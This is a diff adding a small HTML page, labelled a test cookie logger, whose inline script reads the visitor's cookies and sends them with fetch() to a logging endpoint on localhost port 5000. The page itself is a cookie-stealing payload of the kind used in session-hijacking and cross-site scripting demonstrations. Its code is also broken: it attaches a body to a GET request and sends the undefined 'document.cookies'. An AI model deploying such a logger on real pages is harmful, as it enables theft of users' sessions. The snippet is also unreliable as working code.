@@ -1,0 +1,19 @@
+<html>
+<head>
+    <title>Test Cookie Logger</title>
+    <script>
+        var cookies = document.cookie;
+        fetch('http://127.0.0.1:5000/log_cookie', {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ cookies: document.cookies })
+        });
+    </script>
+</head>
+<body>
+    <h1>Test Cookie Logger</h1>
+    <h2>Your cookies are being logged (for testing purposes only).</h2>
+</body>
+</html>
